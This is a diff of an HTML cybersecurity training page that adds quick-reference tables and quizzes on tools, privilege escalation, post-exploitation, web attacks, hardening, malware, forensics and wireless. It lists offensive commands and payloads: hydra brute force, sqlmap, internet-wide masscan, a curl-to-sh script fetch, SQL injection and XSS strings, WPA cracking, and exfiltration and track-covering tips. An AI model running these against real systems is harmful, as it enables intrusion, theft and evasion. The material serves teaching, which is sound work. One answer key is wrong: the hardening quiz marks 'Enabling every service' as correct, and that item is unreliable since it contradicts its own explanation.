+  <p>Which Metasploit payload gives an interactive, scriptable session?</p>
+  <div class="q-opt" data-correct="false">A. shell_reverse</div>
+  <div class="q-opt" data-correct="true">B. Meterpreter</div>
+  <div class="q-opt" data-correct="false">C. staged bind</div>
+  <div class="q-opt" data-correct="false">D. Havoc</div>
+  <div class="q-explain">Meterpreter runs in-memory and offers commands like sysinfo, migrate, and upload.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A buffer overflow occurs when:</p>
+  <div class="q-opt" data-correct="false">A. A program reads past EOF</div>
+  <div class="q-opt" data-correct="true">B. Data written exceeds the buffer's capacity</div>
+  <div class="q-opt" data-correct="false">C. Two processes share memory</div>
+  <div class="q-opt" data-correct="false">D. A disk is full</div>
+  <div class="q-explain">Overwriting adjacent memory can corrupt state or hijack execution.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>The component that runs after a vulnerability is triggered is the:</p>
+  <div class="q-opt" data-correct="false">A. Exploit</div>
+  <div class="q-opt" data-correct="true">B. Payload</div>
+  <div class="q-opt" data-correct="false">C. Listener</div>
+  <div class="q-opt" data-correct="false">D. Fuzzer</div>
+  <div class="q-explain">The exploit delivers the bug; the payload performs the action (shell, etc.).</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A NOP sled is used to:</p>
+  <div class="q-opt" data-correct="false">A. Encrypt the payload</div>
+  <div class="q-opt" data-correct="true">B. Reliably land on shellcode in memory</div>
+  <div class="q-opt" data-correct="false">C. Evade IDS signatures</div>
+  <div class="q-opt" data-correct="false">D. Defeat ASLR entropy</div>
+  <div class="q-explain">A long run of NOP instructions gives the CPU a target to slide into the shellcode.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-bugbounty" data-cat="Bug Bounty" data-title="Bug Bounty">
   <h1>Bug Bounty</h1>
   <p class="ssub">Learn to find and report vulnerabilities for rewards through bug bounty programs and responsible disclosure.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Recon first</strong></td><td>Enumerate subdomains: amass, subfinder</td></tr>
+    <tr><td><strong>Check scope</strong></td><td>Only test in-scope assets</td></tr>
+    <tr><td><strong>Report template</strong></td><td>Title, severity, steps, impact, fix</td></tr>
+    <tr><td><strong>Common bugs</strong></td><td>IDOR, XSS, SSRF, info disclosure, weak auth</td></tr>
+    <tr><td><strong>Disclosure</strong></td><td>Coordinated/Responsible > public</td></tr>
+    <tr><td><strong>Start</strong></td><td>Small programs, read policy carefully</td></tr>
+    <tr><td><strong>Tools</strong></td><td>Burp Suite, nuclei, waybackurls</td></tr>
+    <tr><td><strong>Severity</strong></td><td>CRITICAL > HIGH > MEDIUM > LOW > INFO</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Bug Bounty Platforms & Programs</h3>
   <p><strong>HackerOne</strong>, <strong>Bugcrowd</strong>, <strong>Intigriti</strong>, and <strong>YesWeHack</strong> connect researchers with programs. Private programs (invite-only) pay more. Government programs (e.g., VDP) have specific scope and rules.</p>
@@ -1313,11 +1761,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Clear, reproducible steps are essential for triage teams to verify and fix vulnerabilities.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Responsible disclosure means:</p>
+  <div class="q-opt" data-correct="false">A. Posting the bug publicly first</div>
+  <div class="q-opt" data-correct="true">B. Privately notifying the vendor and allowing time to fix</div>
+  <div class="q-opt" data-correct="false">C. Selling the bug</div>
+  <div class="q-opt" data-correct="false">D. Ignoring the bug</div>
+  <div class="q-explain">Responsible/coordinated disclosure gives the vendor a head start on patching.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which bug class is often a great first find for beginners?</p>
+  <div class="q-opt" data-correct="false">A. Zero-day kernel bug</div>
+  <div class="q-opt" data-correct="true">B. IDOR (Insecure Direct Object Reference)</div>
+  <div class="q-opt" data-correct="false">C. Hardware fault</div>
+  <div class="q-opt" data-correct="false">D. DNS poisoning</div>
+  <div class="q-explain">IDORs only require changing an object reference (e.g. ?id=2) and are common.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>You discover a vulnerability in an out-of-scope asset. You should:</p>
+  <div class="q-opt" data-correct="false">A. Test it anyway</div>
+  <div class="q-opt" data-correct="true">B. Stop and report it only if the policy allows</div>
+  <div class="q-opt" data-correct="false">C. Sell the data</div>
+  <div class="q-opt" data-correct="false">D. Ignore the scope</div>
+  <div class="q-explain">Testing out-of-scope assets violates policy and may be illegal.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A strong bug report includes:</p>
+  <div class="q-opt" data-correct="false">A. A vague description</div>
+  <div class="q-opt" data-correct="true">B. Reproduction steps, impact, and evidence</div>
+  <div class="q-opt" data-correct="false">C. Only a screenshot</div>
+  <div class="q-opt" data-correct="false">D. A demand for payment</div>
+  <div class="q-explain">Clear steps to reproduce, impact analysis, and proof make reports actionable.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-tools" data-cat="Tools" data-title="Tools Master Reference">
   <h1>Tools Master Reference</h1>
   <p class="ssub">Comprehensive reference of cybersecurity tools: installation, usage, and practical examples.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Burp Suite</strong></td><td>Intercept/modify HTTP traffic</td></tr>
+    <tr><td><strong>Wireshark</strong></td><td>Analyze pcap network captures</td></tr>
+    <tr><td><code>hydra -l admin -P pass.txt host ssh</code></td><td>Brute force login</td></tr>
+    <tr><td><code>john rockyou.txt</code></td><td>Crack password hashes</td></tr>
+    <tr><td><code>sqlmap -u URL --dbs</code></td><td>Automate SQL injection</td></tr>
+    <tr><td><code>gobuster</code></td><td>Directory/subdomain brute forcing</td></tr>
+    <tr><td><code>nikto</code></td><td>Web vulnerability scanner</td></tr>
+    <tr><td><code>hashcat -m 0 hash.txt wordlist</code></td><td>GPU hash cracking</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Scanning & Enumeration Tools</h3>
   <p><strong>Nmap</strong>: port scanning, service detection, OS fingerprinting. <code>nmap -sV -sC -O target</code>. <strong>Masscan</strong>: fastest port scanner (millions of IPs/sec). <code>masscan 0.0.0.0/0 -p0-65535 --rate 10000</code>.</p>
@@ -1383,11 +1881,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Hashcat uses GPU acceleration for significantly faster password cracking than CPU-based tools.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which tool intercepts and modifies HTTP traffic for web testing?</p>
+  <div class="q-opt" data-correct="false">A. Wireshark</div>
+  <div class="q-opt" data-correct="true">B. Burp Suite</div>
+  <div class="q-opt" data-correct="false">C. Nmap</div>
+  <div class="q-opt" data-correct="false">D. Hashcat</div>
+  <div class="q-explain">Burp Suite proxies requests so you can edit and replay them.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which tool analyzes pcap network captures?</p>
+  <div class="q-opt" data-correct="true">A. Wireshark</div>
+  <div class="q-opt" data-correct="false">B. Aircrack-ng</div>
+  <div class="q-opt" data-correct="false">C. Gobuster</div>
+  <div class="q-opt" data-correct="false">D. Metasploit</div>
+  <div class="q-explain">Wireshark decodes packets and protocols from live traffic or capture files.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which tool brute-forces web directories and subdomains?</p>
+  <div class="q-opt" data-correct="false">A. Nikto</div>
+  <div class="q-opt" data-correct="true">B. Gobuster</div>
+  <div class="q-opt" data-correct="false">C. John</div>
+  <div class="q-opt" data-correct="false">D. Hydra</div>
+  <div class="q-explain">gobuster fuzzes directories/files; Nikto scans known server vulns.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which tool automates SQL injection exploitation?</p>
+  <div class="q-opt" data-correct="true">A. Sqlmap</div>
+  <div class="q-opt" data-correct="false">B. Nuclei</div>
+  <div class="q-opt" data-correct="false">C. Sqlite3</div>
+  <div class="q-opt" data-correct="false">D. Sqlplus</div>
+  <div class="q-explain">sqlmap detects and exploits SQLi to dump databases automatically.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-privesc" data-cat="Privilege Escalation" data-title="Privilege Escalation">
   <h1>Privilege Escalation</h1>
   <p class="ssub">Techniques for escalating privileges on Linux and Windows systems after initial access.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>sudo -l</code></td><td>Check sudo permissions</td></tr>
+    <tr><td><code>find / -perm -4000 2>/dev/null</code></td><td>Find SUID binaries</td></tr>
+    <tr><td><code>linpeas.sh</code></td><td>Automated Linux enumeration</td></tr>
+    <tr><td><code>winpeas.exe</code></td><td>Automated Windows enumeration</td></tr>
+    <tr><td><strong>kernel exploits</strong></td><td>Match kernel version to CVE</td></tr>
+    <tr><td><strong>unquoted service path</strong></td><td>Windows service exploit</td></tr>
+    <tr><td><code>crontab -l</code></td><td>List scheduled tasks</td></tr>
+    <tr><td><strong>env vars / configs</strong></td><td>Look for leaked passwords</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Linux Privilege Escalation</h3>
   <p>Automated enumeration: <strong>LinPEAS</strong>: <code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>. Checks: SUID binaries, cron jobs, writable files, kernel exploits, capabilities, and misconfigurations.</p>
@@ -1453,11 +2001,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">SeImpersonatePrivilege allows a process to impersonate authenticated users using their access tokens.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which Linux attribute lets a binary run with its owner's privileges?</p>
+  <div class="q-opt" data-correct="false">A. SGID</div>
+  <div class="q-opt" data-correct="true">B. SUID</div>
+  <div class="q-opt" data-correct="false">C. Sticky bit</div>
+  <div class="q-opt" data-correct="false">D. Umask</div>
+  <div class="q-explain">SUID (setuid, 4000) runs the file as its owner — a classic privesc vector.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>The command sudo -l reveals:</p>
+  <div class="q-opt" data-correct="false">A. All system users</div>
+  <div class="q-opt" data-correct="true">B. Commands you may run with sudo</div>
+  <div class="q-opt" data-correct="false">C. Open ports</div>
+  <div class="q-opt" data-correct="false">D. Kernel modules</div>
+  <div class="q-explain">sudo -l lists permitted commands, useful for finding escalation paths.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Kernel exploits target:</p>
+  <div class="q-opt" data-correct="false">A. Weak passwords</div>
+  <div class="q-opt" data-correct="true">B. Vulnerabilities in the operating system kernel</div>
+  <div class="q-opt" data-correct="false">C. Open shares</div>
+  <div class="q-opt" data-correct="false">D. Firewall misconfig</div>
+  <div class="q-explain">Kernel bugs can grant root access; match the exploit to the exact kernel version.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which is a common Windows privilege escalation vector?</p>
+  <div class="q-opt" data-correct="true">A. Unquoted service paths</div>
+  <div class="q-opt" data-correct="false">B. Raw sockets</div>
+  <div class="q-opt" data-correct="false">C. Swap files</div>
+  <div class="q-opt" data-correct="false">D. FAT32</div>
+  <div class="q-explain">Unquoted service paths let attackers drop an executable earlier in the path.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-postexp" data-cat="Post-Exploitation" data-title="Post-Exploitation & Lateral Movement">
   <h1>Post-Exploitation & Lateral Movement</h1>
   <p class="ssub">Techniques for maintaining access, pivoting through networks, and achieving objectives after initial compromise.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Persistence</strong></td><td>cron jobs, SSH keys, startup entries</td></tr>
+    <tr><td><strong>Lateral movement</strong></td><td>SSH, RDP, SMB, pass-the-hash</td></tr>
+    <tr><td><code>mimikatz</code></td><td>Dump Windows credentials</td></tr>
+    <tr><td><strong>Pivoting</strong></td><td>Route through compromised host</td></tr>
+    <tr><td><strong>Exfiltration</strong></td><td>scp, curl, DNS tunneling</td></tr>
+    <tr><td><strong>Cleanup</strong></td><td>Remove artifacts, logs</td></tr>
+    <tr><td><strong>Cover tracks</strong></td><td>Log tampering, timestomping</td></tr>
+    <tr><td><strong>postexploitation msf</strong></td><td>sysinfo, screenshot, migrate, shell</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Data Exfiltration & Persistence</h3>
   <p>Data exfiltration: encode data to avoid detection. <code>base64 file | xclip -selection clipboard</code>. Use DNS tunneling: <strong>dnscat2</strong>, <strong>iodine</strong>. HTTP/S channels blend with normal traffic. <strong>Rclone</strong> for cloud exfiltration.</p>
@@ -1523,11 +2121,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Timestomp modifies file modification, access, and creation times to make forensic analysis harder.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Persistence techniques are used to:</p>
+  <div class="q-opt" data-correct="false">A. Boost performance</div>
+  <div class="q-opt" data-correct="true">B. Maintain access across reboots</div>
+  <div class="q-opt" data-correct="false">C. Hide the IP</div>
+  <div class="q-opt" data-correct="false">D. Encrypt the disk</div>
+  <div class="q-explain">Persistence (cron, services, SSH keys) keeps access after the target restarts.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Pivoting lets an attacker:</p>
+  <div class="q-opt" data-correct="false">A. Hide their identity</div>
+  <div class="q-opt" data-correct="true">B. Reach internal hosts through a compromised one</div>
+  <div class="q-opt" data-correct="false">C. Bypass the firewall permanently</div>
+  <div class="q-opt" data-correct="false">D. Change MAC addresses</div>
+  <div class="q-explain">The compromised host becomes a relay to the internal network.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which technique dumps credentials from Windows memory?</p>
+  <div class="q-opt" data-correct="true">A. Mimikatz</div>
+  <div class="q-opt" data-correct="false">B. Nmap</div>
+  <div class="q-opt" data-correct="false">C. Wireshark</div>
+  <div class="q-opt" data-correct="false">D. Curl</div>
+  <div class="q-explain">Mimikatz extracts plaintext passwords, hashes, and Kerberos tickets.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Data exfiltration is:</p>
+  <div class="q-opt" data-correct="false">A. Encrypting data at rest</div>
+  <div class="q-opt" data-correct="true">B. Unauthorized removal of data from the network</div>
+  <div class="q-opt" data-correct="false">C. Restoring backups</div>
+  <div class="q-opt" data-correct="false">D. Archiving logs</div>
+  <div class="q-explain">Exfiltration moves sensitive data out, e.g. via scp, HTTP, or DNS tunneling.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-websecurity" data-cat="Web Security" data-title="Web Application Security">
   <h1>Web Application Security</h1>
   <p class="ssub">Master web vulnerabilities: SQLi, XSS, CSRF, SSRF, XXE, and web application penetration testing.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>OWASP Top 10 (2021)</strong></td><td>A01 Broken Access Control, A02 Crypto Failures, A03 Injection...</td></tr>
+    <tr><td><strong>XSS test</strong></td><td>&lt;script&gt;alert(1)&lt;/script&gt;</td></tr>
+    <tr><td><strong>SQLi test</strong></td><td>' OR 1=1 -- -</td></tr>
+    <tr><td><strong>IDOR</strong></td><td>Change IDs in URLs/APIs</td></tr>
+    <tr><td><strong>CSRF</strong></td><td>Forge authenticated requests</td></tr>
+    <tr><td><strong>Security headers</strong></td><td>CSP, HSTS, X-Frame-Options, X-Content-Type-Options</td></tr>
+    <tr><td><strong>WAF bypass</strong></td><td>Encoding, case tricks, alternate payloads</td></tr>
+    <tr><td><strong>burp tools</strong></td><td>Repeater, Intruder, Scanner, Proxy</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">SQL Injection Deep Dive</h3>
   <p><strong>In-band SQLi</strong>: visible results. <strong>Union-based</strong>: <code>' UNION SELECT null,username,password FROM users--</code>. <strong>Error-based</strong>: <code>' AND 1=CONVERT(int,(SELECT @@version))--</code>. Determine column count with <code>ORDER BY n</code>.</p>
@@ -1593,11 +2241,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">The alg:none attack sets the JWT algorithm to none, bypassing signature verification entirely.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>What was the #1 OWASP Top 10 category in 2021?</p>
+  <div class="q-opt" data-correct="false">A. Injection</div>
+  <div class="q-opt" data-correct="true">B. Broken Access Control</div>
+  <div class="q-opt" data-correct="false">C. XSS</div>
+  <div class="q-opt" data-correct="false">D. Insecure Design</div>
+  <div class="q-explain">Broken Access Control (A01) includes IDOR and privilege issues.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Stored XSS lets an attacker:</p>
+  <div class="q-opt" data-correct="true">A. Execute scripts in every visitor's browser</div>
+  <div class="q-opt" data-correct="false">B. Crash the database</div>
+  <div class="q-opt" data-correct="false">C. Read server files</div>
+  <div class="q-opt" data-correct="false">D. Brute force logins</div>
+  <div class="q-explain">Malicious input persisted on the page runs in other users' browsers.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>SQL injection primarily targets:</p>
+  <div class="q-opt" data-correct="false">A. The reverse proxy</div>
+  <div class="q-opt" data-correct="true">B. Database queries built from user input</div>
+  <div class="q-opt" data-correct="false">C. The CDN</div>
+  <div class="q-opt" data-correct="false">D. Client-side storage</div>
+  <div class="q-explain">Unsafe query concatenation lets attackers manipulate SQL logic.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>CSRF forces an authenticated victim to:</p>
+  <div class="q-opt" data-correct="false">A. Give away their password</div>
+  <div class="q-opt" data-correct="true">B. Perform unintended actions (e.g. transfer funds)</div>
+  <div class="q-opt" data-correct="false">C. Install malware locally</div>
+  <div class="q-opt" data-correct="false">D. Change DNS</div>
+  <div class="q-explain">CSRF abuses the victim's session to submit forged requests.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-ossecurity" data-cat="OS Security" data-title="OS Security & Attacks">
   <h1>OS Security & Attacks</h1>
   <p class="ssub">Operating system security hardening, common attacks, and defensive techniques for Windows and Linux.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Hardening</strong></td><td>Disable unused services, patch, least privilege</td></tr>
+    <tr><td><strong>CIS Benchmarks</strong></td><td>Configuration standards per OS</td></tr>
+    <tr><td><strong>Patch cycle</strong></td><td>Known CVEs are the #1 entry vector</td></tr>
+    <tr><td><strong>EDR</strong></td><td>Endpoint Detection and Response</td></tr>
+    <tr><td><strong>MFA</strong></td><td>Multi-factor authentication</td></tr>
+    <tr><td><strong>HIPS/HIDS</strong></td><td>Host intrusion prevention/detection</td></tr>
+    <tr><td><strong>App allowlisting</strong></td><td>Only run approved executables</td></tr>
+    <tr><td><strong>Audit logs</strong></td><td>Enable and review system logging</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Windows Security Hardening</h3>
   <p>Harden with <strong>Group Policy</strong>: enforce password policies, disable unnecessary services, restrict USB storage, enable audit logging. <strong>Windows Defender</strong>: enable ATP, configure ASR rules, network protection.</p>
@@ -1663,11 +2361,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">MITRE ATT&CK provides a comprehensive knowledge base of adversary tactics, techniques, and procedures.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which practice is core to OS hardening?</p>
+  <div class="q-opt" data-correct="true">A. Enabling every service</div>
+  <div class="q-opt" data-correct="false">B. Disabling unnecessary services and ports</div>
+  <div class="q-opt" data-correct="false">C. Giving all users admin</div>
+  <div class="q-opt" data-correct="false">D. Disabling logs</div>
+  <div class="q-explain">Reducing attack surface by disabling unneeded services is a hardening baseline.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>EDR stands for:</p>
+  <div class="q-opt" data-correct="true">A. Endpoint Detection and Response</div>
+  <div class="q-opt" data-correct="false">B. Encrypted Data Relay</div>
+  <div class="q-opt" data-correct="false">C. External Domain Routing</div>
+  <div class="q-opt" data-correct="false">D. Event Data Repository</div>
+  <div class="q-explain">EDR monitors endpoints for suspicious behavior and enables response.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Patching mainly reduces risk from:</p>
+  <div class="q-opt" data-correct="false">A. Zero-days</div>
+  <div class="q-opt" data-correct="true">B. Known vulnerabilities with public fixes</div>
+  <div class="q-opt" data-correct="false">C. Physical theft</div>
+  <div class="q-opt" data-correct="false">D. Phishing</div>
+  <div class="q-explain">Most breaches exploit known, patchable vulnerabilities.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>The principle of least privilege means:</p>
+  <div class="q-opt" data-correct="false">A. Everyone gets admin</div>
+  <div class="q-opt" data-correct="true">B. Users get only the access their role requires</div>
+  <div class="q-opt" data-correct="false">C. No accounts</div>
+  <div class="q-opt" data-correct="false">D. Guests first</div>
+  <div class="q-explain">Least privilege limits blast radius and lateral movement.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-malware" data-cat="Malware Analysis" data-title="Malware Analysis">
   <h1>Malware Analysis</h1>
   <p class="ssub">Analyze malware behavior, reverse engineer binaries, and develop detection signatures.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Types</strong></td><td>Virus, worm, trojan, ransomware, rootkit, keylogger</td></tr>
+    <tr><td><strong>Triage</strong></td><td>File type, hashes, strings, suspicious imports</td></tr>
+    <tr><td><code>strings file</code></td><td>Extract readable strings</td></tr>
+    <tr><td><strong>Static analysis</strong></td><td>Review code without executing</td></tr>
+    <tr><td><strong>Dynamic analysis</strong></td><td>Run in a sandbox, watch behavior</td></tr>
+    <tr><td><strong>Process monitor</strong></td><td>Watch file/reg/network activity</td></tr>
+    <tr><td><strong>YARA rules</strong></td><td>Pattern matching for malware families</td></tr>
+    <tr><td><strong>VT / Joe Sandbox</strong></td><td>Online analysis sandboxes</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Malware Types & Taxonomy</h3>
   <p><strong>Viruses</strong>: attach to executables, spread via user action. <strong>Worms</strong>: self-replicating, spread without user interaction. <strong>Trojans</strong>: disguise as legitimate software. <strong>Ransomware</strong>: encrypt files for ransom. <strong>Spyware</strong>: covert surveillance.</p>
@@ -1733,11 +2481,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">EIP (Extended Instruction Pointer) holds the address of the next instruction to execute.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Which malware spreads without the victim running a file?</p>
+  <div class="q-opt" data-correct="false">A. Trojan</div>
+  <div class="q-opt" data-correct="true">B. Worm</div>
+  <div class="q-opt" data-correct="false">C. Ransomware</div>
+  <div class="q-opt" data-correct="false">D. Rootkit</div>
+  <div class="q-explain">Worms self-replicate across networks automatically.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Static malware analysis:</p>
+  <div class="q-opt" data-correct="false">A. Executes the sample</div>
+  <div class="q-opt" data-correct="true">B. Examines code/strings without running it</div>
+  <div class="q-opt" data-correct="false">C. Sends it to a botnet</div>
+  <div class="q-opt" data-correct="false">D. Installs it</div>
+  <div class="q-explain">Static analysis inspects bytes, imports, and strings in a safe environment.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A sandbox is mainly used for:</p>
+  <div class="q-opt" data-correct="false">A. Storing backups</div>
+  <div class="q-opt" data-correct="true">B. Dynamic analysis of malware in isolation</div>
+  <div class="q-opt" data-correct="false">C. Compiling exploits</div>
+  <div class="q-opt" data-correct="false">D. Packet capture</div>
+  <div class="q-explain">Sandboxes run suspicious files while monitoring their behavior.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Ransomware's primary goal is to:</p>
+  <div class="q-opt" data-correct="false">A. Steal credentials</div>
+  <div class="q-opt" data-correct="true">B. Encrypt data and demand payment</div>
+  <div class="q-opt" data-correct="false">C. Mine crypto</div>
+  <div class="q-opt" data-correct="false">D. Hide as a service</div>
+  <div class="q-explain">Ransomware encrypts files and extorts the victim for the key.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-forensics" data-cat="Forensics & IR" data-title="Digital Forensics & Incident Response">
   <h1>Digital Forensics & Incident Response</h1>
   <p class="ssub">Master forensic investigation, evidence collection, memory analysis, and incident response procedures.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><strong>Order of volatility</strong></td><td>CPU/registers > RAM > disk > backups</td></tr>
+    <tr><td><strong>Acquisition</strong></td><td>Forensic image = bit-for-bit copy</td></tr>
+    <tr><td><strong>Hashing</strong></td><td>SHA-256 verifies evidence integrity</td></tr>
+    <tr><td><strong>Autopsy</strong></td><td>Open-source forensic workbench</td></tr>
+    <tr><td><strong>Volatility</strong></td><td>RAM memory analysis</td></tr>
+    <tr><td><strong>Windows artifacts</strong></td><td>Prefetch, $MFT, Event Logs, Registry</td></tr>
+    <tr><td><strong>Chain of custody</strong></td><td>Document evidence handling</td></tr>
+    <tr><td><strong>Timeline analysis</strong></td><td>Correlate events by timestamps</td></tr>
+  </table>
+</div>
 
   <h3 class="subtopic-title">Forensic Investigation Methodology</h3>
   <p><strong>Chain of custody</strong>: document every person who handles evidence. Use write-blockers for disk imaging. <strong>Order of volatility</strong>: capture memory first, then disk, then network. Document everything with timestamps.</p>
@@ -1803,11 +2601,61 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="q-explain">Preparation is the first phase — building IR capabilities before incidents occur.</div>
 </div>
 
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>The very first step of incident forensics is:</p>
+  <div class="q-opt" data-correct="false">A. Analyzing the hard drive</div>
+  <div class="q-opt" data-correct="true">B. Preserving and securing evidence</div>
+  <div class="q-opt" data-correct="false">C. Interviewing suspects</div>
+  <div class="q-opt" data-correct="false">D. Rebuilding the system</div>
+  <div class="q-explain">Preserve evidence (image, hashes, chain of custody) before any analysis.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Hashing during acquisition verifies:</p>
+  <div class="q-opt" data-correct="true">A. Data integrity</div>
+  <div class="q-opt" data-correct="false">B. File ownership</div>
+  <div class="q-opt" data-correct="false">C. Network speed</div>
+  <div class="q-opt" data-correct="false">D. Disk health</div>
+  <div class="q-explain">Matching hashes prove the image is a faithful copy of the original.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>Windows prefetch files contain:</p>
+  <div class="q-opt" data-correct="false">A. Deleted files</div>
+  <div class="q-opt" data-correct="true">B. Program execution history</div>
+  <div class="q-opt" data-correct="false">C. Email drafts</div>
+  <div class="q-opt" data-correct="false">D. WiFi passwords</div>
+  <div class="q-explain">Prefetch records recently executed applications with timestamps.</div>
+</div>
+<div class="quiz">
+  <h4>&#128221; Quick Quiz</h4>
+  <p>A forensic image is:</p>
+  <div class="q-opt" data-correct="false">A. A compressed archive</div>
+  <div class="q-opt" data-correct="true">B. An exact bit-for-bit copy of the drive</div>
+  <div class="q-opt" data-correct="false">C. A file listing</div>
+  <div class="q-opt" data-correct="false">D. A cloud backup</div>
+  <div class="q-explain">Imaging duplicates every bit, including deleted and hidden data.</div>
+</div>
 </div>
 
 <div class="sc" id="sec-wireless" data-cat="Wireless & RF" data-title="Wireless, Bluetooth & RF Hacking">
   <h1>Wireless, Bluetooth & RF Hacking</h1>
   <p class="ssub">Master wireless network attacks, Bluetooth exploitation, SDR, and RF security testing.</p>
+<div class="cs-block">
+  <div class="cs-head">&#9889; Quick Reference</div>
+  <table class="cs-table">
+    <tr><th>Command / Term</th><th>What it does</th></tr>
+    <tr><td><code>airmon-ng start wlan0</code></td><td>Enable monitor mode</td></tr>
+    <tr><td><code>airodump-ng wlan0mon</code></td><td>Capture beacons and handshakes</td></tr>
+    <tr><td><code>aircrack-ng cap.pcap</code></td><td>Crack WPA handshake</td></tr>
+    <tr><td><strong>Evil twin</strong></td><td>Rogue AP impersonating a legit network</td></tr>
+    <tr><td><strong>Deauth attack</strong></td><td>Force clients to reconnect (capture handshake)</td></tr>
